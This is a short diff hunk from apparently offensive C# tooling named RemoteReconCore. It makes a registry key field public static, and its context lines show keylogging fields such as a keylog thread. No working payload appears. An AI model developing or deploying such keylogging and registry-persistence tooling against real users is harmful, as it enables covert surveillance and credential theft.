@@ -175,7 +175,7 @@ namespace RemoteReconCore
         public static KeyValuePair<int, string> result;
         private bool kl = false;
         private Thread keylogThread;
-        RegistryKey rrbase;
+        public static RegistryKey rrbase;
 
         public enum Result : int
         {
